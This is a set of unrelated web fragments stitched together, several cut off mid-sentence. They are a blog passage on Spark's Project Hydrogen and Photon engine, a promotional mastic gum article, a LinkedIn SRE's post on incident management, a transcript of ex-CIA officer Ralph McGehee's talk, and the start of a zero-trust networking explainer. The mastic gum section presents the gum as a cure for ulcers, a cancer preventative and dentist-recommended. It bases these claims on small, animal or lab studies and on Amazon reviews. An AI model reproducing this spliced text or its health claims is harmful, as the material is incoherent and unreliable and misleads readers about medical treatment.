<p>The other thing Spark needs to stay relevant, is to provide a good dev experience for deep learning projects. <a rel="noreferrer noopener" href="https://deeplearning4j.konduit.ai/distributed-deep-learning/howto" target="_blank">DeepLearning4J can work with Spark</a>, but I think we already established that’s not where spark is heading, nor where ML innovation is happening.  The more interesting work on adding Deep-learning to Spark  is “project Hydrogen”.</p>



<p>“Project Hydrogen’ is an on-going effort since spark 2.4. It still has some way to go but it already yielded interesting changes like <a rel="noreferrer noopener" href="https://developer.nvidia.com/blog/optimizing-and-improving-spark-3-0-performance-with-gpus/" target="_blank">spark on GPUs</a> and<a rel="noreferrer noopener" href="https://issues.apache.org/jira/browse/SPARK-24374" target="_blank"> barrier scheduler</a> . Barrier scheduler is particularly interesting as it is an additional execution scheduler that is <strong>not map/reduce</strong> and more aligned with MPI  (there are good explanations <a href="http://blog.madhukaraphatak.com/barrier-execution-mode-part-1/">here</a> and <a rel="noreferrer noopener" href="https://www.waitingforcode.com/apache-spark/apache-spark-2.4.0-features-barrier-execution-mode/read" target="_blank">here</a>).  This enables things like <a rel="noreferrer noopener" href="https://docs.databricks.com/applications/machine-learning/train-model/distributed-training/horovod-runner.html" target="_blank">HorovodRunner</a> and<a rel="noreferrer noopener" href="https://github.com/tensorflow/ecosystem/tree/master/spark/spark-tensorflow-distributor" target="_blank"> better integration with TesorFlow</a> (better vs. <a rel="noreferrer noopener" href="https://github.com/yahoo/TensorFlowOnSpark" target="_blank">Yahoo’s TensorFlowOnSpark</a>) as can be seen in the example code (posted on the repo):</p>

<p>Lastly, if python is taking center-stage, the whole JVM (Scala in this case) is becoming more of a nuisance Spark needs to tag along vs.  the advantage it used to be (and still is in many use cases – but we’re talking trends here). Indeed, in a couple of other session on the Spark summit, Databricks talked  about  the Photon execution engine (depicted below)  they are currently developing and is<a href="https://techcommunity.microsoft.com/t5/analytics-on-azure/turbocharge-azure-databricks-with-photon-powered-delta-engine/ba-p/1694929"> available on Azure Databricks </a>. According to the “brochure” it brings 20x performance improvement over spark 2.4 – this was done by reimplementing Spark’s engine in C++ and  I don’t know if this would become open-source or not ,I am not even sure if this is the beginning of the end or just the end of the beginning for spark – I am sure it is a big deal.  One other sure thing these changes in spark are bad news for Scala (but that’s for another post :) )</p>

<p><strong>M</strong>astic gum is resin&nbsp;from&nbsp;the Mastic tree found on the Greek island Chios. It's been labelled as a superfood because of its numerous health&nbsp;properties- which we'll talk about in just a bit.&nbsp;</p>
<p>&nbsp; &nbsp;But in the last 5 years its popularity has skyrocketed for&nbsp;a reason no Greek farmer could have ever expected.&nbsp;</p>
<h3><strong><em>It can sharpen your jawline</em></strong></h3>
<p>&nbsp; &nbsp;People are catching on to an old BodyBuilder method for building muscle in the jawline- chewing mastic gum! Because it's 10x harder than regular gum it's basically like taking your jaw to the gym.</p>
<p>&nbsp; &nbsp;Apparently this is relatively well-known in Hollywood and the BodyBuilding space. Now it's&nbsp;making its way into the mainstream. More on that later. First you've got to understand where it comes from to know why it's so special:</p>

<meta charset="utf-8">

<p><em>Mastic gum from the Greek island Chios</em></p>


<meta charset="utf-8">

<meta charset="utf-8">
<p><strong>T</strong>he people of Chios have&nbsp;cultivated and harvested mastic or "Mastiha" for over 2500 years. The hot and humid climate is ideal for the 6-month, laborious process.</p>

<p><img src="https://cdn.shopify.com/s/files/1/0340/7226/4840/files/mastic-gum-from-chios_0706dfc7-3e37-472b-9669-5ec2e9f92bad_480x480.jpg?v=1607283273" alt="Farmers harvesting chios resin"></p>
<p><em>Farmers harvesting Mastic on the Greek island Chios</em></p>

<meta charset="utf-8">
<p>&nbsp; &nbsp;Every 4-5 days, several&nbsp;cuts are made in the trees to slowly drain the resin. It takes roughly 15-20 days for the crystal to solidify and fall off. Because of the way it falls from the tree and it's shape, these small pieces of resin are called "Tears of Chios". The farmers then collect these small teardrops and wash them in natural spring water.</p>
<meta charset="utf-8">
<h3><strong>It&nbsp;has a refreshing cedar flavour.</strong></h3>



<p><strong>M</strong>astic's earliest identified uses was as chewing gum- the additional benefits were yet to be discovered.</p>
<p>&nbsp; &nbsp;Mastic producing villages&nbsp;were fortresses,&nbsp;bordered by huge walls. The only way to enter these villages was by ladder, designed to shield the resin from invaders.</p>
<p>I'm not exaggerating when I say: <span><a href="https://en.wikipedia.org/wiki/Chios_massacre"><strong>wars were fought over mastic gum</strong></a>.</span></p>
<p>&nbsp; &nbsp;During the Ottoman rule of Chios in the 1800s, mastic was <strong>worth its weight in Gold.&nbsp;</strong>In todays gold prices that means 1 piece would cost $59.14</p>
<p>&nbsp; &nbsp;Luckily for us, it doesn't cost that much. But with its growing popularity, maybe someday it might. Let's talk about <em>why </em>it's selling out around the world:</p>



<p><strong>T</strong>he ancient Mediterraneans loved mastic and thought it had "magic" healing properties. Thanks to modern science we know today how that "magic" works. Here's the 7 main health benefits we use it for today:</p>
<ol>
<li><strong><a href="#dental">Aids Dental Health</a></strong></li>
<li><strong><a href="#inflammation">Anti-Inflammatory</a></strong></li>
<li>
<strong><a href="#cholesterol">Lowers Cholesterol &amp;</a></strong><strong>&nbsp;Blood Sugar</strong>
</li>
<li><strong><a href="#biotic">Anti-Biotic&nbsp;/ Anti-Fungal</a></strong></li>
<li><strong><a href="#digestion">Soothes Digestion &amp; Heartburn</a></strong></li>
<li><strong><a href="#cancer">Cancer Preventative</a></strong></li>
<li><strong><a href="#asthma">Asthma Treatment</a></strong></li>
</ol>

<h3><b>Here's The "Magical" Ingredients (Skip If Boring)</b></h3>
<meta charset="utf-8">
<p><span>Mastic gum is composed of several bioactive compounds responsible for its numerous health benefits. These include <em>triterpenic acids</em> (TAs) such as <em>isomasticadienolic acid</em> as well as triterpenes. These are natural antibiotics that also act as strong anti-inflammatories.</span></p>
<p><span>&nbsp; &nbsp;Mastiha naturally&nbsp;contains large percentages of organic compounds like Terpenoids, which add to its aromatic element. The main active Terpenoids include&nbsp;<em>alpha-pinene</em> (40%), <em>beta-myrcene</em>, <em>beta-pinene</em>, <em>limonene</em>, and <em>beta-caryophyllene</em>.&nbsp;</span></p>
<p><span>&nbsp; &nbsp;<em>Alpha-pinene</em> is also found in pines and rosemary. It's what gives Mastic a fresh pine/cedar flavor.&nbsp;As well as providing a strong woody aroma, it's also a potent topical antiseptic. </span></p>
<p><span>&nbsp; &nbsp;Unlike regular chewing gums, which are</span><span>&nbsp;filled with artificial coloring and flavors, <strong>mastic gum&nbsp;is 100% natural.</strong></span></p>


<h2 id="dental"><span>1. Aids Dental Health (Prevent Cavities)</span></h2>
<meta charset="utf-8">
<p><strong>T</strong>here are&nbsp;multiple studies about Mastic gum and its positive effect on dental health.&nbsp;A <span><a href="https://meridian.allenpress.com/angle-orthodontist/article/77/1/124/58081/Short-term-Effect-of-Mastic-Gum-on-Salivary">2007 study</a>&nbsp;</span>found that chewing&nbsp;mastic gum may potentially help prevent teeth cavities by&nbsp;reducing bacteria in the mouth and the pH of saliva.</p>

<p><img src="https://cdn.shopify.com/s/files/1/0340/7226/4840/files/Tooth-decay-diagram_b8ee88bd-931a-4d5d-b51e-ad0d796e9211_480x480.jpg?v=1607283312" alt="Diagram of tooth decay"></p>
<p><em>Mastic gum has been shown to reduce the build-up of plaque</em></p>

<p><span>&nbsp; &nbsp;After chewing mastic gum for 15 minutes, participants in the study were found to have lower levels of&nbsp;</span><em>lactobacilli</em> and <em>S Mutans</em> in the oral cavity. The rate of bacteria levels even remained low even 2.25 hours later. This same effect was further supported by&nbsp;a&nbsp;<span><a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC4281189/">2014 study</a></span>.</p>
<p>What this means for you is:</p>
<h3><strong>Mastic Gum Prevents Cavities And Bad Breath</strong></h3>
<meta charset="utf-8">
<p>&nbsp; &nbsp;There's no need to worry about chewing a random resin that came from a tree in Greece- it's recommended by dentists!</p>
<p>Just chew it&nbsp;like a regular piece of gum and chuck it when you're done.&nbsp;</p>
<p><em><strong>WEIRD FACT:&nbsp;</strong>you can swallow mastic gum! It can be broken down by your stomach like any other food because it's 100% natural.</em>&nbsp;</p>


<meta charset="utf-8">
<h2 id="inflammation"><strong>2. Anti-Inflammatory (Heal Faster)</strong></h2>
<meta charset="utf-8">
<p><span><strong>M</strong>astic's anti-inflammatory properties may help with autoimmune illness&nbsp;and chronic inflammation.</span></p>
<p><span>&nbsp; &nbsp;It decreases the levels of various inflammatory substances and blocks inflammatory pathways. It also aids the activation of neutrophils which is a type of white blood cell.</span></p>

<meta charset="utf-8"><br>
<h2 id="cholesterol">
<span>3.&nbsp;Lower Cholesterol &amp; Blood Sugar&nbsp;</span>(Healthier Heart)</h2>
<meta charset="utf-8">
<p><span><strong>O</strong>ur modern lazy-lifestyles and unnatural diet have made high cholesterol and high blood sugar levels commonplace. These two things increase the risk of heart disease and type 2 diabetes. Some studies suggest that chewing mastic gum could help&nbsp;restore these levels.</span></p>
<p>&nbsp; &nbsp;A <span><a href="https://journals.sagepub.com/doi/abs/10.1177/2047487315603186">2015 study</a></span>&nbsp;conducted&nbsp;<span>with</span>&nbsp;156 healthy individuals found that daily mastic consumption lead to lower total cholesterol levels. These results were observed after 8 weeks.</p>
<meta charset="utf-8">
<p>&nbsp; &nbsp;In a <span><a href="https://journals.sagepub.com/doi/10.1177/2047487315603186">2016&nbsp;study</a></span>, people who took mastic&nbsp;in some form also experienced lower blood glucose levels which are&nbsp;sometimes associated with high cholesterol levels. Mastic was found to have&nbsp;a greater effect on people who are overweight or obese.</p>


<meta charset="utf-8">
<h2 id="biotic"><strong>4. Anti-Biotic / Anti-Fungal (Good For Everything)</strong></h2>
<meta charset="utf-8">
<p><strong>B</strong>alancing our body's bacteria is a crucial function of our diet. Mastic has anti-fungal and anti-inflammatory properties that&nbsp;serve as a&nbsp;cure for several ailments.</p>

<h3>Soothing Stomach Ulcers</h3>
<meta charset="utf-8">
<p><span>Mastic&nbsp;has been shown to&nbsp;help in treating symptoms of peptic ulcers (stomach ulcers).</span></p>
<p>&nbsp; &nbsp;A well-known <span><a href="https://onlinelibrary.wiley.com/doi/abs/10.1111/j.1440-1681.1984.tb00864.x">study</a>&nbsp;</span>conducted in 1984 on 38 people demonstrated that 1 gram of mastic gum taken daily, results in reduction of ulcer symptoms in less than 2 weeks.</p>

<h3><strong>Reducing Helicobacter Pylori Bacteria In The Stomach</strong></h3>
<p><span>Helicobacter pylori bacteria infections are a major risk factor that can contribute to stomach ulcers. If left unchecked, t</span>hese bacteria&nbsp;may potentially lead to stomach cancer.</p>
<p>&nbsp; &nbsp;Mastic gum's antibacterial capabilities against&nbsp;<i><span>H. pylori </span></i>have been shown to mitigate these risks. A<span> <a href="https://www.sciencedirect.com/science/article/abs/pii/S0944711309002396?via%3Dihub">study</a></span>&nbsp;from 2010, found that mastic gum destroyed&nbsp;H. pylori colonies faster than a placebo in a 14 day period.</p>


<meta charset="utf-8">
<h2 id="digestion">
<strong>5.&nbsp;</strong><strong>Soothes Digestion &amp; Heartburn</strong>
</h2>
<meta charset="utf-8">
<p><span><strong>M</strong>astic gum's most common use (for health purposes) throughout history has been as a cure for digestive problems.</span></p>
<p>&nbsp; &nbsp;One<span> <a href="https://onlinelibrary.wiley.com/doi/abs/10.1111/j.1440-1681.1984.tb00864.x">study</a></span> found that 1g of mastic gum a day, led to fewer stomach aches and heartburn in volunteers. If you read <span><a href="https://www.amazon.com/s?k=mastic+gum&amp;ref=nb_sb_noss_2">Amazon</a></span> reviews for Mastiha and mastic gum, you will find hundreds of cases where it has cured men and women's ulcers and digestion problems:</p>

<p><em>Mastic gum is an almost "magical" cure for stomach ulcers&nbsp;&nbsp;</em></p>

<h3>Helps Inflammatory Bowel Disease (IBD)</h3>
<p>New research presented in <span><a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC4367210/">2015 review</a></span> suggests that mastic gum can help with inflammatory bowel diseases (IBD), including Crohn’s disease.&nbsp;</p>
<p><span>&nbsp; &nbsp;A study conducted on 60 people with IBD found that individuals who consumed mastic in any form had&nbsp;measurable improvements in their IBD inflammation markers such as&nbsp;</span><span>decreased levels of IL-6 and C-reactive protein. This was over a 3 week period.</span></p>


<meta charset="utf-8">
<h2 id="cancer"><strong>6.&nbsp;Cancer Preventative</strong></h2>
<p><span><strong>R</strong>esearchers</span>&nbsp;are currently investigating mastic gum’s role in inhibiting the growth of prostate cancer. According to a<a href="https://acsjournals.onlinelibrary.wiley.com/doi/full/10.1002/cncr.21935"><span>&nbsp;</span><span>2006 study</span>,</a> mastic gum can inhibit an androgen receptor that could have an effect on the development of prostate cancer.</p>
<p>&nbsp; &nbsp;Mastic&nbsp;has been shown to weaken the function of the androgen receptor in&nbsp;these&nbsp;cancer cells. More recent<span>&nbsp;<a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC4951764/"><span>laboratory studies</span></a></span><span>&nbsp;have uncovered more about how this effect works.</span></p>
<p><span>&nbsp; &nbsp;<a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC5476564/">Research from 2017</a>&nbsp;</span>suggests that mastic&nbsp;may also help suppress the growth of tumors that can lead to colon cancer. Researchers found that mastic inhibited the increase of colon cells. It has been show to&nbsp;inhibit the growth of colon carcinoma tumors.</p>


<meta charset="utf-8">
<h2 id="asthma"><strong>7. Asthma Treatment</strong></h2>
<meta charset="utf-8"><meta charset="utf-8">
<p><strong>M</strong>astic gum's anti-inflammatory properties may make it useful in treating<span>&nbsp;allergenic asthma</span>. This type of asthma often includes airway inflammation, eosinophilia, and airway hyper-responsiveness.</p>
<p>&nbsp; &nbsp;In a<span>&nbsp;<span><a href="https://www.atsjournals.org/doi/full/10.1165/rcmb.2010-0212OC">2011 study</a></span></span><span>&nbsp;conducted&nbsp;</span>on mice, mastic gum significantly inhibited eosinophilia, reduced airway hyper-responsiveness, and blocked the production of inflammatory substances. It had a positive effect on lung fluid and lung inflammation. In vitro tests found that mastic gum inhibited cells that react negatively to allergens and cause airway inflammation.</p>
<p>&nbsp; &nbsp;These results are promising but further studies are needed to determine efficacy in human cases.</p>


<meta charset="utf-8">

<p><span><strong>G</strong>enerally well-tolerated and 100% natural, mastic and&nbsp;doesn't have any major reported side effects. </span></p>
<p><span>&nbsp; &nbsp;In some rare cases, it may cause dizziness, headache, or an upset stomach. These cases are likely due to increased tension in the muscles surrounding your skull because mastic gum is so much harder than what we are accustomed to chewing.</span></p>
<p><span>&nbsp; &nbsp;<strong>Start with a small quantity and see how your body reacts to it</strong>.&nbsp; Once you're sure there's no&nbsp;negative&nbsp;effects you can gradually increase the dose.&nbsp;</span></p>
<p><span>&nbsp; &nbsp;It's always possible to have an allergic reaction to something new</span><span>. So monitor how you feel and consult a doctor if you're concerned.</span></p>
<meta charset="utf-8">
<p><span>You shouldn’t take mastic gum if you’re pregnant or breastfeeding.</span>&nbsp;</p>

However, I had never been oncall before I joined Linkedin and the impact of a system outage that affects thousands of engineers made the first week of oncall pretty overwhelming.</p><p><img src="https://ronaknathani.com/blog/2020/11/what-i-wish-i-knew-about-incident-management/then-with-caption.gif" alt="first week of me handling production issues"></p><p>But things got better overtime.</p><p>In this post, I would like to share the incident management practices I have picked up over the years as an SRE at Linkedin that help me keep calm under pressure and effectively drive incidents to resolution.</p><p><img src="https://ronaknathani.com/blog/2020/11/what-i-wish-i-knew-about-incident-management/now-with-caption.gif" alt="present me handling production issues"></p><h2 id="what-this-post-is-not-about">What this post is not about</h2><p>In this post, I am not going to talk about how to debug linux or distributed systems or the various debugging tools.

I was meeting smart engineers and learning new things. It wasn’t until my first oncall rotation that I started thinking <em>what if there’s an outage and I need to fix it?</em></p><p><img src="https://ronaknathani.com/blog/2020/11/what-i-wish-i-knew-about-incident-management/anxious.gif" alt="anxiety before first week of oncall"></p><p>Now, don’t get me wrong. LinkedIn has really good systems in place for monitoring/alerting, triaging issues and a very well defined process for incident response. Those are absolutely critical. And to prepare, I had shadowed our oncall the week prior and even had an experienced team member shadow me to guide and help me out, but still, I was anxious.</p><p>Here’s what I wish I had known.</p><ul><li><a href="#before-oncall-starts">Before oncall starts</a><ul><li><a href="#oncall-handoff">Oncall handoff</a></li><li><a href="#organizing-slack-during-an-oncall-week">Organizing Slack during an oncall week</a></li></ul></li><li><a href="#signal-vs-noise">Signal vs Noise</a><ul><li><a href="#trust-but-verify---not-all-alerts-are-created-equal">Trust, but verify - not all alerts are created equal</a></li><li><a href="#declaring-an-incident">Declaring an incident</a></li></ul></li><li><a href="#communication-during-an-incident">Communication during an incident</a><ul><li><a href="#the-incident-title-and-scoping-the-impact">The incident title and scoping the impact</a></li><li><a href="#establish-communication-channels-and-an-incident-lead">Establish communication channels and an incident lead</a></li><li><a href="#communicate-changes-to-the-system">Communicate changes to the system</a></li><li><a href="#provide-regular-updates">Provide regular updates</a></li></ul></li><li><a href="#incident-response-is-a-collaborative-process">Incident response is a collaborative process</a><ul><li><a href="#get-help-early">Get help early</a></li><li><a href="#working-with-others">Working with others</a></li><li><a href="#video-conferencing-is-your-friend">Video conferencing is your friend</a></li></ul></li><li><a href="#towards-a-resolution">Towards a resolution</a><ul><li><a href="#looking-at-changes">Looking at changes</a></li><li><a href="#keep-calm-and-carry-on---one-step-at-a-time">Keep calm and carry on - one step at a time</a></li></ul></li><li><a href="#learning-from-the-incident">Learning from the incident</a></li></ul><h2 id="before-oncall-starts">Before Oncall Starts</h2><h3 id="oncall-handoff">Oncall handoff</h3><p>Before an oncall week starts, I talk to the person who is currently oncall to get context on any incidents that happened during the week or any weird bugs that were discovered in our stack. It gives me perspectives on issues that could be getting carried over from the previous week and any critical changes I should be aware of.
Although you can’t plan for all that happens during an oncall week, a proper handoff helps you prepare for it.</p><h3 id="organizing-slack-during-an-oncall-week">Organizing Slack during an oncall week</h3><p>As an SRE on LinkedIn’s container scheduler and deployment infrastructure team, our users are engineers at LinkedIn. We use Slack for internal communication and we have certain channels where users share issues they are experiencing with the tooling or to get our oncall’s attention. During an oncall week, I star these channels and organize my sidebar so that I can easily notice messages from our users and distinguish them from the other messages I receive. As an optional tip - I also like to mute/leave channels that I am not actively participating in to reduce clutter.</p><p>As compared to a normal week, I spend more time on Slack when I am oncall - responding to people, answering support requests, helping users with tooling. These Slack notifications can create a little bit of distraction, however, considering all our users are internal, a rise in messages on our channels can also indicate that something might be wrong with our system and our alerting hasn’t caught it yet.</p><p><img src="https://ronaknathani.com/blog/2020/11/what-i-wish-i-knew-about-incident-management/slack-pings.gif" alt="slack pings during oncall"></p><h2 id="signal-vs-noise">Signal vs Noise</h2><h3 id="trust-but-verify---not-all-alerts-are-created-equal">Trust, but verify - not all alerts are created equal</h3><p><img src="https://ronaknathani.com/blog/2020/11/what-i-wish-i-knew-about-incident-management/trust-but-verify-you-must.jpg" alt="trust-but-verify-you-must"></p><p><i>This is something I learned during my interview at LinkedIn and it has been very applicable in my experience since.</i></p><p>In early days of oncall and incident management, it is very common to feel as if things are on fire when any alert gets triggered. Over time, I have realized that gaining context and verifying that the alert is actually indicating an issue helps with the right next steps. It is important to distinguish signal from noise because:</p><ul><li>An alert could be non-actionable as it was recently configured with a threshold that’s making it too noisy</li><li>The monitoring stack is down and the alert is being triggered because the configuration treats a lack of data points as an issue</li><li>Your service is operating perfectly fine, however, the traffic tier routing requests to your service had an issue</li><li>Timer on a deliberately silenced alert expired and the alert started triggering</li></ul><p>I have experienced all of the above at some point in time. Now when I either receive an alert or a user reports an issue, I check our services (metrics, logs, reproduce the reported problem etc.) to verify that the issue is real.</p><h3 id="declaring-an-incident">Declaring an incident</h3><p>Not all actionable alerts result in an incident. To be effective at identifying the ones that do, it is extremely crucial to think about the bigger picture of mitigating the issue than be overwhelmed by the technical task of resolving the alert.</p><p>Some of the qualitative measures that help make this differentiation is to consider whether an issue requires coordinating the fix with other teams or whether the issue is impacting customers or violating an SLO. If any of the conditions are true, declare an incident. It is always better to declare an incident early in the process than waiting too long.</p><p>At LinkedIn, we have defined guidelines for all teams about what warrants an incident along with different levels of severity. This takes guesswork out of the picture, and provides a shared understanding to every team member.</p><h2 id="communication-during-an-incident">Communication during an incident</h2><h3 id="the-incident-title-and-scoping-the-impact">The incident title and scoping the impact</h3><p>Every incident gets a title. I didn’t realize it initially, but giving an incident a title forces one to define the problem and communicate it to the stakeholders very succinctly. When communicating to stakeholders, <strong>scoping the incident is very important</strong>. What I mean by scoping is identifying how big the impact is - which environment is impacted, is the impact limited to a region or is it global, how many customers are impacted, etc. For instance, “the login feature on the site is not working” vs “the login feature on the site is not working for traffic originating from Asia Pacific” say two very different things.</p><h3 id="establish-communication-channels-and-an-incident-lead">Establish communication channels and an incident lead</h3><p>We heavily rely on Slack to communicate during an incident. A dedicated slack channel helps focus all the energy and inputs from everyone in one place. It helps the incident lead collect data about symptoms that the users are experiencing and also captures a log of considered/discarded hypotheses and any changes made to the system. Once the Slack channel is created, establish an incident lead and let everyone know who is driving the incident forward.</p><p>Eslablishing explicit comms channels for reporting and identifying issues and establishing an incident lead reduce the delay in action and disambiguate any confusion.</p><h3 id="communicate-changes-to-the-system">Communicate changes to the system</h3><p>If there’s a fix you’d like to try out, let others know who are and encourage everyone to do the same. This ensures that the potential fix doesn’t make an already bad situation worse and helps catch any blind spots early. If you do end up making a change to the system after getting consensus, let others know and follow up on its effects.</p><h3 id="provide-regular-updates">Provide regular updates</h3><p>While working towards a resolution for the incident, it is very easy to get overwhelmed by the technical details and miss to communicate an update. This leads to angry leadership and annoyed customers who have no insight into what’s happening.</p><p>An update provides visibility to the customers that the issue is being worked upon and lets the leadership identify if they can help out with anything. Depending on the severity of the incident, an update every 15-30 mins serves pretty well. The update doesn’t have to be extremely detailed, rather a brief summary describing the current state and immediate next steps is sufficient. An example update:</p><blockquote><p><strong>[UPDATE]</strong> Our hypothesis about the memory leak checks out and we have validated the fix in the staging environment. We have pushed out the change and as soon as it goes through the CI pipeline, we’ll canary the new release, monitor metrics and promote the change after verifying the fix.</p></blockquote><h2 id="incident-response-is-a-collaborative-process">Incident response is a collaborative process</h2><h3 id="get-help-early">Get help early</h3><p>In my earlier days, I used to think that it was solely my responsibility to mitigate the issue, find the root cause, and roll out the fix. If I couldn’t do it, it wouldn’t reflect well on me. In reality, incident management, like much of software development, is a very collaborative process.</p><p>One of the big differences in how I approach it now is I focus on actively pulling in other engineers who could help with debugging or resolving the issue early in the process. This change in perspective has relieved me of a lot of unnecessary stress and also made me more effective at resolving incidents.</p><p>When requesting help, be specific about the task as well as the urgency. It helps others calibrate their response and manage things they might have at hand.</p><h3 id="working-with-others">Working with others</h3><p>One of the most important things while handling incidents is working with others. Considering the multi-faceted nature of an SRE role, it’s one of the most important while underrated skills.</p><p>With multiple people involved, various possibilities get shared and one of the responsibilities of the incident lead is to guide these discussions in a productive direction while filtering out the noise. One should be cautious about going down any rabbit holes and focus on stopping the bleeding first. If there’s a probable cause, share it early - it helps rule out possibilities. And it’s okay to ask questions that seem obvious, but specific questions are more helpful.</p><p>Being fearlessly curious, and keeping an open mind enables one to consider possibilities that could be overseen otherwise. Remember, you are working together as a team on sharing and ruling out hypotheses to solve a challenging problem.</p><h3 id="video-conferencing-is-your-friend">Video Conferencing is your friend</h3><p>We …</p></div></div>

<p><b>Ralph W. McGehee:</b> It's a real honor for me to be here today. I don't often say that, but I really mean it. I like to start off my talk by mentioning two things. One, please don't believe anything I'm going to tell you. The American people are so inundated by misinformation, there's absolutely no reason you should believe anything anybody tells you, particularly the evening news. Of course, with everything there is an exception, and I think in my case, I have a fairly valid exception. Because of the process that I had to go through to clear my book, I had to prove that everything I am saying is in the public domain. I still go down to the Agency about twice a month and turn in new material to let them clear it. And in doing that process, I have to produce or pull out from government documents that particular information, because they inevitably will say, "You can't say it, it's classified." And I will inevitably locate that information in the public domain.</p> 
 
<p>So if you doubt me, and I hope you will, there is a way to check up on me. Go to the library and look in the back of my book, and almost every major conclusion that I will be talking about here today will be documented to an official government document. I've drawn upon the Pentagon Papers. Are you all familiar with the Pentagon Papers? And the Senate and House investigations of the Agency and a variety of other material. So don't believe what I say, but if you want to check up on me, the information is available.</p> 
 
<p>Secondly, I'd like to say my message is basically a real downer. It is real negative, but I don't want to leave you with that impression, because I just returned from a two week speaking trip in Iowa, where I was going to testify at the court case there in Iowa City for the protesters, and in Nebraska. And I've been in Arizona and various other places speaking, and wherever you go, you find concerned groups. So I am encouraged. I know during the Vietnam War for the first ten years, we didn't even know what was going on. And then eleven or twelve years later, people began to protest. But this time in Latin America, the protest was almost instantaneous. The substructure is there. The only reason we got out of Vietnam, of course, is because of the student protests. So I am very encouraged. My message is negative, but I don't want to leave you with that impression. I am very, very encouraged.</p> 
 
<p>I think I should talk in three basic phases. One, walk you very quickly through my career with the Agency up to right now where I am today, and back up and walk you through Vietnam a little bit or walk you through my career in a little more detail, including Vietnam. Now I do that not to talk about Vietnam but because the processes that are followed today in Central America, in the Middle East and in Africa have all been used in Vietnam. I'll take out three or four incidences, and they are documented by the way, and show you that these are sort of typical of what the Agency does around the world since the very beginning in '47, what it's doing today in '86.</p> 
 
<p>Then I'll go back and review the Agency's domestic operations, and I'll do that for one purpose, because everything they were doing up to the mid-seventies they are now doing again. The only difference now is under President Reagan's Executive Order 12333 of December '81, they can do the things legally that they were doing illegally before. It's the only difference. Then I would like to talk, sort of bring it all together in Central America and talk about El Salvador, Grenada, and particularly Nicaragua, and then come to my conclusion. So that's basically the approach I'll take.</p> 
 
<p>I went to the University of Notre Dame. I played on four undefeated football teams, three national championships, and then I tried out with the Green Bay Packers. And to this day, I can't understand what's the matter with the coaches up there. When I was cut, I received a cable, "Would you be interested in an important government position similar to the State Department in function?" My football background was not irrelevant. When I went down to Washington, I found that the class before me, my class, and the class after me were basically rejects from the National Football League, not the standard concept of an intelligent (He does say "intelligent" here, I think as a joke about football players) officer.</p> 
 
<p>Well, I served in the Agency for 25 years. The first 15 or 16 years, I believed that the CIA was sort of like a missionary organization, out saving the world for democracy and religion and gathering good intelligence to help our policymakers make good decisions. When I'd go into work in the morning, I'd feel a real pride that I'm part of the great crusade to stop the international communist conspiracy. All that began to change for me in Vietnam. That's when I began protesting.</p> 
 
<p>I should mention that I served my entire 25 years in the Directorate of Operations. Now, the Agency is broken down to basically four directorates, Administration, Science and Technology, Intelligence, and Operations. Administrators administrate. Science and Technology, they devise the sophisticated collection devices and monitor the results. The Directorate of Intelligence, that's the scholars who sit and read the reports that come in from around the world and then put out the final reports. And the Operators operate. The Directorate of Operations has two basic functions, covert operations and gathering intelligence covertly.</p> 
 
<p>Since it's my contention that the Agency is little more than a covert action agency, I will dwell a little bit on it. Now, covert action operations in broadest context can be described as those operations designed to overthrow or support foreign governments. Overthrow operations have four basic components, economic warfare, political warfare, psychological warfare, and economic warfare. In my 25 years in the Agency, I served overseas in Japan, in the Philippines, in Taiwan, six years or three tours in Thailand, and two years as the chief police adviser to the head of the Vietnamese Special Police. That's the equivalent of our FBI.</p> 
 
<p>As I said, my period of protests began around the Vietnam War. I for the next period within the Agency began protesting, and having no luck with those protests, I finally left the Agency in 1977. Now, in a stroke of real irony at this particular point, because they had assigned me to the CIA’s Siberia. When you escalate your protest, you become persona non grata. In '77 in a stroke of irony, they awarded me the Career Intelligence Medal and the Honorable Service Medal. Of course, I think I know why. They knew they had a loose cannon and they wanted to kind of damp me down, appease me a little bit. And I think that was the purpose of giving them to me.</p> 
 
<p>But I also earlier had won awards, two Vietnam service awards, a commendation from the director for devising a program of counterinsurgency and intelligence, and a variety of other CIA and foreign awards. Well, when I left the Agency, I testified before the Senate and House intelligence committees and before a variety of other Senate and House committees, all related to CIA activities.</p> 
 
<p>I immediately set about writing a book about my experiences. It took me three years to research and write the book, and then like all CIA officers, when you join the Agency, you have to sign a secrecy agreement. And as I said, I must now submit everything to the CIA for pre-publication review. I did, and they came back and they said they have identified approximately 400 security violations in my manuscript. And they returned it in little bits and pieces of paper, because some of these deletions ran up to several pages in length.</p> 
 
<p>Well, to defeat this process, I went through going through the public record and pulling out the identical information. And ultimately with this effort, I got virtually everything reinstated. There are a few little specifics that I didn't get reinstated, but for the most part they were all reinstated. I did in a few cases, they had deleted some very boring information, so I said rather than fight them over this one, let's just leave this comment, "Seven words deleted." It looks a lot sexier than mine. So I didn't fight them on all of them.</p> 
 
<p>Then I went looking for a publisher, a long hard process, and finally one publisher said, "You know, you've written a nice legal brief here. You make your points and then you have your citations to your information. But boy, it's dull as mud. Who would want to read a legal brief? So we will publish it if you'll rewrite it as a autobiography," which I did. I then resubmitted it to the CIA for pre-publication review. I didn't put any more secret details in there. I just added my personal life.</p> 
 
<p>At this time, William Casey had become Director of the CIA, and they in essence told me, "We're not going to let you publish a book." And I said, "Well, you can't stop me. Everything that's in the book, you have not only cleared for other people, it's not only in the public record, but you also cleared for me before. And the laws that you operate under say you may not reclassify information once it's been declassified and released." And their response in essence, "Well, that's tough. We're doing it anyhow. There's nothing you can do about it." Well, this was a very critical period. I just didn't know what to do. I really worried about this, because if they would've stopped me with that, then I would not be able to speak to you here this evening, because everything would have been classified.</p> 
 
<p>So I called <i>The Washington Post</i>, and <i>The Washington Post</i> ran a long exposé of how the CIA was violating the law by reclassifying information that was in the public domain, a violation of the law of the land. This public exposure forced the Agency to relent, and the book was finally released. Subsequent to the release of the book, I then traveled to Cuba, where we stayed about a week, and to Grenada, …</p></div></div>

This is different from a traditional security model where all components inside of a given perimeter are regarded as safe or trusted. It was introduced as a reaction to the traditional network security model as a measure against lateral movement after a breach.</p>
</section><article><section><p>In <a href="https://www.oreilly.com/library/view/zero-trust-networks/9781491962183/ch01.html">Zero Trust Networks by Evan Gilman, Doug Barth</a>, a Zero Trust network is defined as a network built on five fundamental assertions:</p>
<ol>
<li>The network is always assumed to be hostile</li>
<li>External and internal threats exist on the network at all times</li>
<li>Network locality is not sufficient for deciding trust in a network</li>
